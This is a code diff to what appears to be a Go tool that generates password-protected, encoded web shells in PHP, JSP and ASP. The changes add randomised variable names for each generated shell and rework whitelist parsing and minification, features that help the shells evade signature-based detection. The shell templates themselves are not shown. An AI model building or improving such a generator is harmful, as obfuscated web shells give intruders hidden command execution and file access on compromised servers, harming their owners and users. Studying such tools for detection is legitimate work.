@@ -11,9 +11,12 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
+	"regexp"
 	"strings"
 	"text/template"
+	"time"
 )
 
 var (
@@ -22,7 +25,6 @@ var (
 	cmdHeader      string
 	method         string
 	whitelist      string
-	whitelistSlice []string
 	password       string
 	passwordHeader string
 	passwordParam  string
@@ -34,6 +36,7 @@ var (
 	b64            bool
 	fileCap        bool
 	minify         bool
+	seededRand     *rand.Rand
 )
 
 func init() {
@@ -61,16 +64,59 @@ func init() {
 		fmt.Println("-type required")
 		os.Exit(1)
 	}
+
+	seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))
 }
 
 func main() {
-	// Parse csv whitelist
-	if whitelist != "" {
-		whitelist = strings.ReplaceAll(whitelist, ",", "\",\"")
-		whitelist = fmt.Sprintf("\"%s\"", whitelist)
+	varNames := []string{}
+	for i := 0; i < 50; i++ {
+		varNames = append(varNames, genVarName(5, 10))
 	}
+	varNames = unique(varNames)
 
-	log.Println(whitelist)
+	vNameMin := 3
+	vNameMax := 7
+	vNames := map[string]string{
+		"cmd": genVarName(vNameMin, vNameMax), //php,jsp
+
+		"whitelist": genVarName(vNameMin, vNameMax), //php,jsp
+
+		"hash":     genVarName(vNameMin, vNameMax), //php,jsp
+		"pass":     genVarName(vNameMin, vNameMax), //php,jsp
+		"alg":      genVarName(vNameMin, vNameMax), //jsp
+		"hashFunc": genVarName(vNameMin, vNameMax), //jsp
+		"digest":   genVarName(vNameMin, vNameMax), //jsp
+		"asc":      genVarName(vNameMin, vNameMax), //asp
+
+		"cmdArgs":      genVarName(vNameMin, vNameMax), //php,jsp
+		"filePath":     genVarName(vNameMin, vNameMax), //php,jsp
+		"file":         genVarName(vNameMin, vNameMax), //jsp
+		"fileStream":   genVarName(vNameMin, vNameMax), //jsp
+		"fileContents": genVarName(vNameMin, vNameMax), //jsp
+		"mimeType":     genVarName(vNameMin, vNameMax), //jsp
+		"outStream":    genVarName(vNameMin, vNameMax), //jsp
+		"buffer":       genVarName(vNameMin, vNameMax), //jsp
+		"bytesRead":    genVarName(vNameMin, vNameMax), //jsp
+		"destPath":     genVarName(vNameMin, vNameMax), //php
+		"fs":           genVarName(vNameMin, vNameMax), //php
+
+		"encKey":    genVarName(vNameMin, vNameMax), //php
+		"encSrc":    genVarName(vNameMin, vNameMax), //php
+		"dSrc":      genVarName(vNameMin, vNameMax), //php
+		"process":   genVarName(vNameMin, vNameMax), //jsp
+		"output":    genVarName(vNameMin, vNameMax), //jsp
+		"encObj":    genVarName(vNameMin, vNameMax), //asp
+		"b64":       genVarName(vNameMin, vNameMax), //asp
+		"binStream": genVarName(vNameMin, vNameMax), //asp
+		"keyChar":   genVarName(vNameMin, vNameMax), //asp
+
+		"i":         genVarName(vNameMin, vNameMax), //php
+		"ii":        genVarName(vNameMin, vNameMax), //php
+		"msxmlVar":  genVarName(vNameMin, vNameMax), //asp
+		"base64Var": genVarName(vNameMin, vNameMax), //asp
+
+	}
 
 	d := ShellData{
 		Method:           method,
@@ -85,10 +131,16 @@ func main() {
 		EncHeader:        encHeader,
 		EncKey:           encKey,
 		FileCapabilities: fileCap,
+		VarNames:         varNames,
+		V:                vNames,
 	}
 
-	if cmdHeader != "" {
-		d.CmdHeader = cmdHeader
+	// Parse csv whitelist
+	if whitelist != "" {
+		// whitelist = strings.TrimSpace(whitelist)
+		whitelist = strings.Trim(whitelist, " ,")
+		whitelist = strings.ReplaceAll(whitelist, ",", "\",\"")
+		d.Whitelist = fmt.Sprintf("\"%s\"", whitelist)
 	}
 
 	// Password protect
@@ -132,23 +184,23 @@ func main() {
 	code := buf.String()
 	buf.Reset()
 
+	r := regexp.MustCompile("[\n\n]{2,}")
+	code = r.ReplaceAllString(code, "\n")
+
 	// Minify code
 	if minify || encMethod != "" {
+		r := regexp.MustCompile("[ \n\n]{2,}")
+		code = r.ReplaceAllString(code, "\n")
 		if lang == "php" {
-			code = strings.ReplaceAll(code, " ", "")
 			code = strings.ReplaceAll(code, "\n", "")
 		} else if lang == "asp" {
 			// code = strings.ReplaceAll(code, " ", "")
-			code = strings.Trim(code, " \n\n")
+			// code = strings.Trim(code, " \n\n")
 			// code = strings.ReplaceAll(code, "\n", "; ")
 		}
 	}
 
-	code = strings.ReplaceAll(code, "\n\n", "\n")
-	code = strings.ReplaceAll(code, "\n\n", "\n")
-
 	// If using encoding/encryption
-
 	if encMethod == "b64" {
 		code = base64.StdEncoding.EncodeToString([]byte(code))
 		code = strings.ReplaceAll(code, string('\x10'), "")
@@ -222,7 +274,6 @@ type ShellData struct {
 	CmdParam         string
 	CmdHeader        string
 	Whitelist        string
-	WhitelistSlice   []string
 	Password         string
 	PasswordParam    string
 	PasswordHeader   string
@@ -233,6 +284,8 @@ type ShellData struct {
 	EncKey           string
 	EncCode          string
 	FileCapabilities bool
+	VarNames         []string
+	V                map[string]string
 }
 
 func xor(s, key string) (output string) {
@@ -293,4 +346,30 @@ func buildCommand() string {
 	c += "-url "
 
 	return c
+}
+
+func genVarName(min, max int) string {
+	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	l := seededRand.Intn(max-min) + min
+	b := make([]byte, l)
+	for i := range b {
+		b[i] = charset[seededRand.Intn(len(charset))]
+	}
+	name := string(b)
+	if lang == "php" {
+		name = "$" + name
+	}
+	return name
+}
+
+func unique(slice []string) []string {
+	keys := make(map[string]bool)
+	list := []string{}
+	for _, entry := range slice {
+		if _, value := keys[entry]; !value {
+			keys[entry] = true
+			list = append(list, entry)
+		}
+	}
+	return list
 }
